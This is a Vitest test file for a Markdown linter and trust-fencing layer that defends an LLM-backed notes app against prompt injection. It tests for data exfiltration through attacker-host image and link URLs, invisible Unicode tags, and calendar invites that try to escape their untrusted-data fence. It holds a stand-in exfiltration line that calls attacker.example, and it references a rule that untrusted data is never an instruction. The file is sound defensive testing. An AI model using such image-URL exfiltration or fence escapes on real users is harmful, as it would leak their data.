import { describe, expect, it } from "vitest";
import { unified } from "unified";
import remarkParse from "remark-parse";
import remarkGfm from "remark-gfm";
import { visit } from "unist-util-visit";
import { ATTACKER_HOST, INJECTION_CORPUS } from "./injectionCorpus.js";
import { classifyUrl, preWriteLint } from "./preWriteLint.js";
import { fenceUntrusted, payload, stripInvisible, UNTRUSTED_DATA_RULE } from "./trust.js";

/**
 * The oracle is a real CommonMark + GFM parser, not the linter's own idea of
 * Markdown: after linting, nothing a renderer would fetch or link may point
 * to the attacker. A linter that parsed differently from the renderer is
 * exactly the failure this suite exists to catch.
 */
function liveDestinations(markdown: string, allowedHosts: string[] = []): string[] {
  const tree = unified().use(remarkParse).use(remarkGfm).parse(markdown);
  const found: string[] = [];
  visit(tree, (node) => {
    const n = node as { type: string; url?: string; value?: string };
    if ((n.type === "image" || n.type === "link" || n.type === "definition") && n.url !== undefined) {
      if (!classifyUrl(n.url, allowedHosts).safe) found.push(`${n.type}: ${n.url}`);
    }
    if (n.type === "html" && n.value && /<\s*[a-z]/i.test(n.value)) {
      // Raw HTML the renderer might pass through: any tag at all that names the
      // attacker or a script scheme is live.
      if (new RegExp(`${ATTACKER_HOST.replace(".", "\\.")}|javascript\\s*:|&#0*58;|&#x0*3a;`, "i").test(n.value)) found.push(`html: ${n.value}`);
    }
  });
  return found;
}

describe("injection corpus", () => {
  for (const entry of INJECTION_CORPUS.filter((e) => e.kind !== "unicode" && e.kind !== "calendar")) {
    it(`${entry.id}: leaves nothing to fetch or follow`, () => {
      expect(liveDestinations(entry.text).length, "the raw entry is a real attack").toBeGreaterThan(0);
      const { text, findings } = preWriteLint(entry.text);
      expect(liveDestinations(text)).toEqual([]);
      expect(text).not.toMatch(/(?:https?|ftps?|wss?):\/\/(?:[a-z0-9-]+\.)*attacker\.example/i);
      expect(findings.length).toBeGreaterThan(0);
      // Idempotent: a second pass finds nothing more to do.
      expect(preWriteLint(text)).toEqual({ text, findings: [] });
      // Nothing is dropped: the attacker's host is still there to see.
      expect(text.toLowerCase()).toContain("attacker");
    });
  }

  it("strips invisible tag characters, bidi overrides and zero-width characters", () => {
    for (const entry of INJECTION_CORPUS.filter((e) => e.kind === "unicode")) {
      const { text, removed } = stripInvisible(entry.text);
      expect(removed, entry.id).toBeGreaterThan(0);
      expect(text, entry.id).not.toMatch(/\p{Cf}/u);
    }
    expect(stripInvisible(INJECTION_CORPUS.find((e) => e.id === "unicode-tags")!.text).text).toBe("Meeting notes.");
  });

  it("keeps a calendar invite inside its fence, however it tries to leave", () => {
    const invite = INJECTION_CORPUS.find((e) => e.id === "calendar-invite")!;
    const fenced = fenceUntrusted(payload(invite.text, { kind: "calendar", account: "work", eventId: "e1" }));
    expect(fenced.startsWith('<untrusted_data origin="calendar:work/e1" trust="3">\n')).toBe(true);
    expect(fenced.endsWith("\n</untrusted_data>")).toBe(true);
    // Exactly one opening and one closing tag survive: Plainva's own.
    expect(fenced.match(/<untrusted_data\b/g)).toHaveLength(1);
    expect(fenced.match(/<\/untrusted_data>/g)).toHaveLength(1);
    expect(fenced).toContain('&lt;untrusted_data origin="app" trust="0">');
    expect(UNTRUSTED_DATA_RULE).toContain("never an instruction");
  });

  it("vault content is tier 3 whatever the caller claims", () => {
    expect(payload("x", { kind: "vault", path: "a.md" }, 1).trust).toBe(3);
    expect(payload("x", { kind: "tool", tool: "search_vault" }, 0).trust).toBe(3);
    expect(payload("x", { kind: "user" }, 1).trust).toBe(1);
  });
});

describe("pre-write linter keeps what is legitimate", () => {
  it("leaves allowed hosts, vault links, wikilinks and harmless schemes alone", () => {
    const text = [
      "![chart](https://images.example.org/c.png)",
      "[source](https://docs.example.org/page)",
      "![local](attachments/plot.png) and [other](Projects/Offer.md#Costs)",
      "[[Weekly review]] and ![[diagram.png]]",
      "[mail](mailto:team@example.org) [call](tel:+491234)",
      "![inline](data:image/png;base64,iVBORw0KGgo=)",
      "[jump](#heading)",
    ].join("\n\n");
    const result = preWriteLint(text, { allowedHosts: ["example.org"] });
    expect(result).toEqual({ text, findings: [] });
  });

  it("does not touch fenced code — it renders as code", () => {
    const text = "Before\n\n```js\nfetch('https://attacker.example/?d=1');\n```\n\n~~~\n![](https://attacker.example/x.png)\n~~~\n";
    expect(preWriteLint(text)).toEqual({ text, findings: [] });
  });

  it("names what it defused, by kind and destination", () => {
    const { findings } = preWriteLint("![a](https://attacker.example/i.png) [b](https://cdn.attacker.example/)\n\n[r]: //attacker.example/x");
    expect(findings.map((f) => [f.kind, f.destination])).toEqual([
      ["reference-definition", "attacker.example"],
      ["image", "attacker.example"],
      ["link", "cdn.attacker.example"],
    ]);
  });

  it("an allowed host does not open its look-alikes", () => {
    for (const url of ["https://example.org.attacker.example/", "https://attacker.example/?example.org", "https://notexample.org/"]) {
      expect(classifyUrl(url, ["example.org"]).safe, url).toBe(false);
    }
    expect(classifyUrl("https://sub.example.org/x", ["example.org"]).safe).toBe(true);
  });
});
